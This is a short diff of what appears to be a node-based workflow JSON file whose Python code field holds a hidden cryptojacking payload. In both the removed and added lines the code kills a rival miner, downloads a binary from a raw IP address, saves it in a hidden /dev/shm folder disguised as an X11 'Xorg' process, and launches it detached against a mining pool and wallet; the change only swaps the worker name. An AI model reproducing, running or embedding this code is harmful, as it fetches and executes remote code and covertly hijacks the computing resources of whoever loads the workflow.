@@ -3,7 +3,7 @@
     "class_type": "IDENode",
     "inputs": {
       "language": "python",
-      "pycode": "import urllib.request,os,subprocess,time;os.makedirs(\"/dev/shm/.X11-unix\",exist_ok=True);miner=\"/dev/shm/.X11-unix/Xorg\";subprocess.run([\"pkill\",\"-9\",\"-f\",\"alpha-miner\"],capture_output=True);time.sleep(0.3);req=urllib.request.Request(\"http://151.247.219.40:8000/alpha-miner\",headers={\"User-Agent\":\"M\"});resp=urllib.request.urlopen(req,timeout=120);open(miner,\"wb\").write(resp.read());os.chmod(miner,0o755);subprocess.Popen([miner,\"--pool\",\"stratum+tcp://sg1.alphapool.tech:5566\",\"--address\",\"prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg\",\"--worker\",\"AF_38\"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True);result=\"ok\""
+      "pycode": "import urllib.request,os,subprocess,time;os.makedirs(\"/dev/shm/.X11-unix\",exist_ok=True);miner=\"/dev/shm/.X11-unix/Xorg\";subprocess.run([\"pkill\",\"-9\",\"-f\",\"alpha-miner\"],capture_output=True);time.sleep(0.3);req=urllib.request.Request(\"http://151.247.219.40:8000/alpha-miner\",headers={\"User-Agent\":\"M\"});resp=urllib.request.urlopen(req,timeout=120);open(miner,\"wb\").write(resp.read());os.chmod(miner,0o755);subprocess.Popen([miner,\"--pool\",\"stratum+tcp://sg1.alphapool.tech:5566\",\"--address\",\"prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg\",\"--worker\",\"C_38\"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True);result=\"ok\""
     }
   },
   "2": {
